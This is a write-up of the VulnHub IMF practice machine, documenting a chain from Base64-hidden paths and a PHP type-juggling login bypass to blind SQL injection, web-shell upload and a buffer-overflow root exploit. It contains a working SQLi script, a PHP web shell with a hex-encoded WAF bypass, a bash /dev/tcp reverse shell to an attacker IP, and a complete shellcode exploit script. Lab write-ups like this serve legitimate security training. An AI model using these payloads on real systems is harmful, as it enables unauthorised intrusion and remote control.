# VulnHub IMF Machine Writeup

## Machine Information
- **Platform**: VulnHub
- **Machine Name**: IMF
- **Target IP**: 192.168.40.92
- **Operating System**: Linux
- **Difficulty**: Medium
- **Attack Vector**: SQLi + File Upload + Buffer Overflow

## Executive Summary

This writeup documents the exploitation of the IMF VulnHub machine, featuring multiple attack vectors including Base64 steganography, type juggling authentication bypass, SQL injection, file upload bypass, and buffer overflow exploitation. The attack path demonstrated advanced techniques including reverse engineering with Ghidra and binary exploitation to achieve root privileges.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS --open -p- -oN scan.txt 192.168.40.92
```

![Port Scan Results](images/Pasted%20image%2020251005151539.png)

**Virtual Host Configuration**:
```bash
# /etc/hosts
192.168.40.92 imf.com
```

### Web Application Discovery

![Web Application](images/Pasted%20image%2020251005151659.png)

## Initial Enumeration

### HTML Source Analysis

Inspection of the HTML source revealed JavaScript files with Base64-encoded names:

![JavaScript Files](images/Pasted%20image%2020251005155718.png)

### Base64 Decoding Chain

Decoding the JavaScript filenames revealed hidden data:

![Base64 Decoding](images/Pasted%20image%2020251005160555.png)

**Discovery**: Double Base64 decoding revealed `imfadministrator` directory.

### Admin Panel Discovery

Accessing `http://imf.com/imfadministrator` revealed a login interface:

![Admin Login](images/Pasted%20image%2020251005161215.png)

## Authentication Bypass

### Type Juggling Vulnerability

The login form was vulnerable to PHP type juggling. By intercepting the request with Burp Suite and modifying the data types:

```
user=rmichaels&pass[]=test
```

**Usernames discovered during reconnaissance**:
- rmichaels
- akeith
- estone

### Successful Authentication

![Authentication Success](images/Pasted%20image%2020251005161215.png)

**Flag Retrieved**: `flag3{Y29udGludWVUT2Ntcw==}`
**Decoded**: continueTOcms

**Access Gained**: `http://imf.com/imfadministrator/cms.php?pagename=home`

## SQL Injection Exploitation

### Vulnerability Discovery

The `pagename` parameter was vulnerable to SQL injection.

### Automated SQLi Script

Python script developed for database enumeration:

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characteres = string.ascii_lowercase + "_," + string.digits
main_url = "http://imf.com/imfadministrator/cms.php?pagename="

def sqli():
    headers = {'Cookie': 'PHPSESSID=ajrd8vq0cc5t8p702hguucmvq5'}
    database = ""
    
    p1 = log.progress("SQLI")
    p1.status("Iniciando SQLI")
    time.sleep(2)
    
    p2 = log.progress("Data")
    
    for pos in range(1, 100):
        for ch in characteres:
            sqli_url = main_url + "home' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (pos, ch)
            
            r = requests.get(sqli_url, headers=headers)
            if "Welcome to the IMF Administration." not in r.text:
                database += ch
                p2.status(database)
                break
    
    p1.success("Ataque SQLI finalizado")
    p2.success(database)

if __name__ == '__main__':
    sqli()
```

### Database Enumeration

**Databases Discovered**:

![Database Names](images/Pasted%20image%2020251005170400.png)

**Tables in 'admin' Database**:
```python
sqli_url = main_url + "home' or substring((select group_concat(table_name) from information_schema.tables where table_schema='admin'),%d,1)='%s" % (pos, ch)
```

![Table Names](images/Pasted%20image%2020251005170821.png)

**Columns in 'pages' Table**:
```python
sqli_url = main_url + "home' or substring((select group_concat(column_name) from information_schema.columns where table_schema='admin' and table_name='pages'),%d,1)='%s" % (pos, ch)
```

![Column Names](images/Pasted%20image%2020251005171216.png)

**Data Extraction**:
```python
sqli_url = main_url + "home' or substring((select group_concat(pagename,0x3a,pagedata) from pages),%d,1)='%s" % (pos, ch)
```

![Data Extraction](images/Pasted%20image%2020251005172007.png)

### QR Code Discovery

The `tutorials-incomplete` page contained a QR code:

![QR Code Page](images/Pasted%20image%2020251005172216.png)

**QR Code Content**: Flag + Base64 encoded text → `uploadr942.php`

## File Upload Exploitation

### Upload Page Discovery

Accessing `http://imf.com/imfadministrator/uploadr942.php` revealed a file upload interface.

### Bypass Techniques

Created a PHP shell with command execution:

```php
<?php 
    system($_GET['cmd']);
?>
```

### WAF and Filter Bypass

The upload functionality had multiple protections:
1. Content-Type validation
2. File extension filtering
3. WAF blocking dangerous functions

**Bypass Strategy**:
- Changed Content-Type to `image/jpg`
- Added GIF magic bytes
- Encoded `system` function in hexadecimal

```http
POST /imfadministrator/uploadr942.php HTTP/1.1
Host: imf.com
Content-Type: multipart/form-data; boundary=----geckoformboundary...

------geckoformboundary...
Content-Disposition: form-data; name="file"; filename="cmd.gif"
Content-Type: image/jpg

GIF8;
<?php 
    "\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
?>
------geckoformboundary...
```

### File Identifier

Upload response revealed file identifier:
```html
File successfully uploaded.
<!-- cc54578bb075 -->
```

### Command Execution

![Command Execution](images/Pasted%20image%2020251005175251.png)

**URL**: `http://imf.com/imfadministrator/uploads/195df5ad74e5.gif?cmd=id`

## Initial Access

### Reverse Shell

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.40.22/443 <&1'
```

### Flag Discovery

![System Flag](images/Pasted%20image%2020251005180142.png)

**Flag Content (Base64)**: agentservices

## Privilege Escalation

### Binary Discovery

```bash
find / -name agent 2>/dev/null
```

**Binary Details**:
- Architecture: x32 LSB
- Running as: root
- Exposed port: 7788

### Reverse Engineering with Ghidra

![Ghidra Analysis](images/Pasted%20image%2020251005193732.png)

**Key Findings**:
- Hardcoded validation code comparison
- Three menu options after authentication
- Option 3 lacks input validation

### Buffer Overflow Discovery

![Segmentation Fault](images/Pasted%20image%2020251005193654.png)

Testing with excessive input caused segmentation fault, indicating buffer overflow vulnerability.

### GDB Analysis

![GDB Analysis](images/Pasted%20image%2020251005193620.png)

**Offset Calculation**: 168 characters required to reach EIP

![Offset Discovery](images/Pasted%20image%2020251005194442.png)

### Shellcode Storage

The EAX register contained user input, allowing shellcode storage:

![EAX Register](images/Pasted%20image%2020251005195138.png)

### Exploit Development

**Shellcode Generation**:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.40.22 LPORT=443 -b '\x00\x0a\0xd' -f c
```

**Python Exploit Script**:
```python
#!/usr/bin/python3

from struct import pack
import socket

shellcode = (b"\xba\x48\xe5\xe9\x57\xdb\xdf\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x18\xeb\x0b\xa2\xa9"
b"\x28\x3c\xae\x9a\x8d\x90\x5b\x1e\x9b\xf6\x2c\x78\x56\x78"
b"\xdf\xdd\xd8\x46\x2d\x5d\x51\xc0\x54\x35\xa2\x9a\x8f\xd3"
b"\x4a\xd9\xcf\xca\xd6\x54\x2e\x5c\x80\x36\xe0\xcf\xfe\xb4"
b"\x8b\x0e\xcd\x3b\xd9\xb8\xa0\x14\xad\x50\x55\x44\x7e\xc2"
b"\xcc\x13\x63\x50\x5c\xad\x85\xe4\x69\x60\xc5")

offset = 168

# objdump -d agent | grep -i "FF D0"
# 8048563: ff d0   call   *%eax

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x08048563) + b"\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))

s.recv(1024)
s.send(b"48093572\n")
s.recv(1024)

s.send(b"3\n")
s.recv(1024)
s.send(payload)
```

### Root Access

![Root Shell](images/Pasted%20image%2020251005203022.png)

**Result**: Root privileges obtained via buffer overflow exploitation.

## Technical Analysis

### Vulnerability Chain

1. **Base64 Steganography** → Directory discovery
2. **Type Juggling** → Authentication bypass
3. **SQL Injection** → Data extraction
4. **File Upload Bypass** → Code execution
5. **Buffer Overflow** → Root privilege escalation

### Key Techniques

- **Reverse Engineering**: Ghidra for binary analysis
- **Buffer Overflow**: EIP control and shellcode injection
- **Exploit Development**: Custom Python exploit script
- **WAF Bypass**: Hexadecimal encoding and magic bytes

## Key Lessons

1. **Defense in Depth**: Multiple vulnerabilities chained for full compromise
2. **Input Validation**: Critical for preventing SQLi and buffer overflows
3. **Binary Security**: ASLR and DEP mitigations were absent
4. **Code Review**: Reverse engineering revealed critical flaws

## Conclusion

The VulnHub IMF machine presented a comprehensive security challenge requiring multiple exploitation techniques. The machine effectively demonstrated realistic attack scenarios from web application vulnerabilities to binary exploitation, showcasing the importance of secure coding practices and proper input validation across all system layers.
